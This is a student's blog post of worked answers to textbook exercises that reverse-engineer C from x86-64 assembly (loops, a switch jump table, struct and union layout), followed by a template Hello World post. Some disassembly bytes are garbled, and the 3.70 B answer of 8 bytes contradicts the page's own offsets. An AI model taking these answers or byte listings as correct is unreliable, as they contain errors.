<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">loop</span><span class="params">(<span class="type">long</span> x, <span class="type">int</span> n)</span></span><br><span class="line">x in%rdi, n in%esi</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">loop :</span><br><span class="line">	movl	%esi, %ecx</span><br><span class="line">	movl	$1, %edx</span><br><span class="line">	movl	$0, %eax</span><br><span class="line">	jmp		.L2</span><br><span class="line">.L3:</span><br><span class="line">	movq	%rdi, %r8</span><br><span class="line">	andq	%rdx, %r8</span><br><span class="line">	orq		%r8, %rax</span><br><span class="line">	salq	%cl, %rdx</span><br><span class="line">.L2:</span><br><span class="line">	testq %rdx, %rdx</span><br><span class="line">	jne .L3</span><br><span class="line">	rep; ret</span><br></pre></td></tr></table></figure>

<p>以上代码是编译以下整体形式的C 代码产生的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">loop2</span><span class="params">(<span class="type">long</span> x, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> result = ____________;</span><br><span class="line">    <span class="type">long</span> mask;</span><br><span class="line">    <span class="keyword">for</span> (mask = ____________; mask ____________; mask =____________)&#123;</span><br><span class="line">        result |= ____________;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>你的任务是填写这个C 代码中缺失的部分，得到一个程序等价于产生的汇编代码。回想一下，这个函数的结果是在寄存器%rax 中返回的。你会发现以下工作很有帮助：检查循环之前、之中和之后的汇编代码，形成一个寄存器和程序变最之间一致的映射。</p>
<p>A. 哪个寄存器保存着程序值x 、n 、result 和mask?<br>B. result 和mask 的初始值是什么？<br>C. mask 的测试条件是什么？<br>D. mask 是如何被修改的？<br>E. result 是如何被修改的？<br>F. 填写这段C 代码中所有缺失的部分。</p>
<p><strong>解：</strong></p>
<p>A.</p>
<table>
<thead>
<tr>
<th align="left">变量</th>
<th align="left">寄存器</th>
</tr>
</thead>
<tbody><tr>
<td align="left">x</td>
<td align="left">%rdi</td>
</tr>
<tr>
<td align="left">n</td>
<td align="left">%esi</td>
</tr>
<tr>
<td align="left">result</td>
<td align="left">%rax</td>
</tr>
<tr>
<td align="left">mask</td>
<td align="left">%rdx</td>
</tr>
</tbody></table>
<p>B.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = <span class="number">0</span></span><br><span class="line">mask = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mask != <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mask = mask &lt;&lt; n</span><br></pre></td></tr></table></figure>

<p>E.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">loop2</span><span class="params">(<span class="type">long</span> x, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">  <span class="type">long</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="type">long</span> mask;</span><br><span class="line">  <span class="keyword">for</span> (mask = <span class="number">1</span>; mask != <span class="number">0</span>; mask &lt;&lt;= n) &#123;</span><br><span class="line">    result |= (x &amp; mask);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-63"><a href="#3-63" class="headerlink" title="3.63"></a>3.63</h2><p>这个程序给你一个机会，从反汇编机器代码逆向工程一个switch 语句。在下面这个过程中，去掉了switch 语句的主体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">switch_prob</span><span class="params">(<span class="type">long</span> x, <span class="type">long</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> result = x;</span><br><span class="line">    <span class="keyword">switch</span> (n)&#123;</span><br><span class="line">    <span class="comment">/* Fill in code here */</span></span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面给出了这个过程的反汇编机器代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">switch_prob</span> <span class="params">(<span class="type">long</span> x,<span class="type">long</span> n)</span></span><br><span class="line">x in%rdi , n in%rsi</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0000000000400590 &lt;switch_prob&gt;:</span><br><span class="line">400590: 48 83 ee 3c				sub		$0x3c,%rsi</span><br><span class="line">400594: 48 83 fe 05				cmp		$0x5,%rsi</span><br><span class="line">400598: 77 29					ja		4005c3 &lt;switch_prob+0x33&gt;</span><br><span class="line">40059a: ff 24 f5 f8 06 40 00	jmpq	*0x4006f8(,%rsi,8)</span><br><span class="line">4005a1: 48 8d 04 fd 00 00 00	lea		0x0 (,%rdi,8),%rax</span><br><span class="line">4005a8: 00</span><br><span class="line">4005a9: c3						retq	</span><br><span class="line">4005aa: 48 89 f8				mov		%rdi,%rax</span><br><span class="line">4005ad: 48 c1 f8 03				sar		$0x3,%rax</span><br><span class="line">4005b1: c3						retq	</span><br><span class="line">4005b2: 48 89 f8				mov		%rdi,%rax</span><br><span class="line">4005b5: 48 c1 eO 04				shl		$0x4,%rax</span><br><span class="line">4005b9: 48 29 f8				sub		%rdi,%rax</span><br><span class="line">4005bc: 48 89 c7				mov		%rax,%rdi</span><br><span class="line">4005bf: 48 Of af ff				imul	%rdi,%rdi</span><br><span class="line">4005c3: 48 8d 47 4b				lea		Ox4b(%rdi),%rax</span><br><span class="line">4005c7: c3						retq	</span><br></pre></td></tr></table></figure>

<p>跳转表驻留在内存的不同区域中。可以从第5 行的间接跳转看出来，跳转表的起始地址为0x4006f8 。用调试器GDB, 我们可以用命令x&#x2F;6gx 0x4006f8 来检查组成跳转表的6个8 字节字的内存。GDB 打印出下面的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/6gx 0x4006f8</span><br><span class="line">0x4006f8: 0x00000000004005a1 	0x00000000004005c3</span><br><span class="line">0x400708: 0x00000000004005a1 	0x00000000004005aa</span><br><span class="line">0x400718: 0x00000000004005b2	0x00000000004005bf</span><br></pre></td></tr></table></figure>

<p>用C 代码填写开关语句的主体，使它的行为与机器代码一致。</p>
<p><strong>解：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">switch_prob</span><span class="params">(<span class="type">long</span> x, <span class="type">long</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> result = x;</span><br><span class="line">    <span class="keyword">switch</span> (n)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">60</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">62</span>:</span><br><span class="line">            result = <span class="number">8</span>*x;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">63</span>:</span><br><span class="line">            result = x&gt;&gt;<span class="number">3</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">            result= (x&lt;&lt;<span class="number">4</span>)-x;</span><br><span class="line">            x=result;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">65</span>:</span><br><span class="line">            x=x*x;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            result = <span class="number">0x4B</span>+x;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-69"><a href="#3-69" class="headerlink" title="3.69"></a>3.69</h2><p>你负责维护一个大型的C 程序，遇到下面的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> first;</span><br><span class="line">    a_struct a[CNT];</span><br><span class="line">    <span class="type">int</span> last;</span><br><span class="line">&#125; b_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">long</span> i, b_struct *bp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n = bp-&gt;first + bp-&gt;last;</span><br><span class="line">    a_struct *ap = &amp;bp-&gt;a[i];</span><br><span class="line">    ap-&gt;x[ap-&gt;idx] = n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译时常数CNT 和结构a_struct 的声明是在一个你没有访问权限的文件中。幸好，你有代码的’.o’版本，可以用OBJDUMP 程序来反汇编这些文件，得到下面的反汇编代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span> <span class="params">(<span class="type">long</span> i, b_struct *bp)</span></span><br><span class="line">i in %rdi, bp in %rsi</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;test&gt;:</span><br><span class="line">	0: Sb Se 20 01 00 00	mov		0x120(%rsi),%ecx</span><br><span class="line">	6: 03 Oe				add 	(%rsi),%ecx</span><br><span class="line">	S: 4S Sd 04 bf			lea 	(%rdi,%rdi,4),%rax</span><br><span class="line">	c: 4S Sd 04 c6			lea 	(%rsi,%rax,8),%rax</span><br><span class="line">	10: 4S Sb 50 OS			mov 	Ox8(%rax),%rdx</span><br><span class="line">	14: 4S 63 c9			movslq	%ecx,%rcx</span><br><span class="line">	17: 48 89 4c dO 10		mov		%rcx,0x10(%rax,%rdx,8)</span><br><span class="line">	le: c3					retq</span><br></pre></td></tr></table></figure>

<p>运用你的逆向工程技术，推断出下列内容：<br>A. CNT 的值。<br>B. 结构a_struct 的完整声明。假设这个结构中只有字段idx 和x , 并且这两个字段保存的都是有符号值。</p>
<p><strong>解：</strong></p>
<p>A. 7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;test&gt;:</span><br><span class="line">	0: Sb Se 20 01 00 00	mov		0x120(%rsi),%ecx  # Get bp-&gt;last</span><br><span class="line">	6: 03 Oe				add 	(%rsi),%ecx # n = bp-&gt;first</span><br></pre></td></tr></table></figure>

<p>int 类型4字节，还需要进行对齐，所以占8字节，剩下的都是数组<code>a_struct a[CNT];</code>的空间，<br><code>CNT*40 + 8 = 288 = 0x120</code>，所以<code>CNT = 7</code>。</p>
<p>B.</p>
<p>分析汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;test&gt;:</span><br><span class="line">	0: Sb Se 20 01 00 00	mov		0x120(%rsi),%ecx</span><br><span class="line">	6: 03 Oe				add 	(%rsi),%ecx # get n</span><br><span class="line">	S: 4S Sd 04 bf			lea 	(%rdi,%rdi,4),%rax  # compute 5*i</span><br><span class="line">	c: 4S Sd 04 c6			lea 	(%rsi,%rax,8),%rax  # compute bp+40*i</span><br><span class="line">	10: 4S Sb 50 OS			mov 	Ox8(%rax),%rdx # Get bp-&gt;a[i].idx</span><br><span class="line">	14: 4S 63 c9			movslq	%ecx,%rcx # shift n from 32b to 64b</span><br><span class="line">	17: 48 89 4c dO 10		mov		%rcx,0x10(%rax,%rdx,8) # mov n to ap-&gt;x[ap-&gt;idx] </span><br><span class="line">	le: c3					retq</span><br></pre></td></tr></table></figure>

<p>第6行得到idx的值，这里使用的%rdx寄存器，所以应该是long类型；由第一小问可以知道<code>a_struct </code>的大小为40字节，第7行将n从32字节转为64，所以数组x应该是long类型，并且为4个。所以<code>a_struct </code>的完整声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">long</span> idx;</span><br><span class="line">  <span class="type">long</span> x[<span class="number">4</span>];</span><br><span class="line">&#125; a_struct;</span><br></pre></td></tr></table></figure>

<h2 id="3-70"><a href="#3-70" class="headerlink" title="3.70"></a>3.70</h2><p>考虑下面的联合声明：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">ele</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">        <span class="type">long</span> *p;</span><br><span class="line">        <span class="type">long</span> y;</span><br><span class="line">    &#125; e1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">        <span class="type">long</span> x;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">ele</span> *<span class="title">next</span>;</span></span><br><span class="line">    &#125; e2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个声明说明联合中可以嵌套结构。下面的函数（省略了一些表达式）对一个链表进行操作，链表是以上述联合作为元素的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">proc</span><span class="params">(<span class="keyword">union</span> ele *up)</span>&#123;</span><br><span class="line">    up-&gt;___________= *(___________) - ___________;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A. 下列字段的偏移址是多少（以字节为单位）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e1.p    _____________</span><br><span class="line">e1.y	_____________</span><br><span class="line">e2.x	_____________</span><br><span class="line">e2.next	_____________</span><br></pre></td></tr></table></figure>

<p>B. 这个结构总共需要多少个字节？</p>
<p>C. 编译器为proc 产生下面的汇编代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">proc</span> <span class="params">(<span class="keyword">union</span> ele *up)</span></span><br><span class="line">up in %rdi</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">proc:</span><br><span class="line">	movq	8(%rdi), %rax</span><br><span class="line">	movq	(%rax) , %rdx</span><br><span class="line">	movq	(%rdx), %rdx</span><br><span class="line">	subq	8(%rax), %rdx</span><br><span class="line">	movq	%rdx, (%rd)</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>

<p>在这些信息的基础上，填写proc 代码中缺失的表达式。提示：有些联合引用的解释可以有歧义，当你清楚引用指引到哪里的时候，就能够澄清这些歧义。只有一个答案，不需要进行强制类型转换，且不违反任何类型限制。</p>
<p><strong>解：</strong></p>
<p>A.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e1.p    <span class="number">0</span></span><br><span class="line">e1.y	<span class="number">8</span></span><br><span class="line">e2.x	<span class="number">0</span></span><br><span class="line">e2.next	<span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>B. 共需要8字节。</p>
<p>C.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">proc</span><span class="params">(<span class="keyword">union</span> ele *up)</span>&#123;</span><br><span class="line">    up-&gt;e2.x= *((up-&gt;e2.next)-&gt;e1.p) - (up-&gt;e2.next)-&gt;e1.y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/30/SA22011137-%E6%9D%A8%E6%98%8E%E7%8F%A0-%E4%BD%9C%E4%B8%9A2/" data-id="cl9uxk00b0001gwomgsb4aqmq" data-title="" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-test" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/30/test/" class="article-date">
  <time class="dt-published" datetime="2022-10-30T05:20:50.000Z" itemprop="datePublished">2022-10-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/30/test/">test</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/30/test/" data-id="cl9uxk00f0003gwomajl6062w" data-title="test" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/30/hello-world/" class="article-date">
  <time class="dt-published" datetime="2022-10-30T05:19:12.433Z" itemprop="datePublished">2022-10-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/30/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/30/hello-world/" data-id="cl9uxk00g0004gwom56frhi4u" data-title="Hello World" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/10/30/SA22011137-%E6%9D%A8%E6%98%8E%E7%8F%A0-%E4%BD%9C%E4%B8%9A1/">(no title)</a>
          </li>
        
          <li>
            <a href="/2022/10/30/SA22011137-%E6%9D%A8%E6%98%8E%E7%8F%A0-%E5%AE%9E%E9%AA%8C1&2&3/">(no title)</a>
          </li>
        
          <li>
            <a href="/2022/10/30/SA22011137-%E6%9D%A8%E6%98%8E%E7%8F%A0-%E4%BD%9C%E4%B8%9A2/">(no title)</a>
          </li>
        
          <li>
            <a href="/2022/10/30/test/">test</a>
          </li>
        
          <li>
            <a href="/2022/10/30/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2022 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>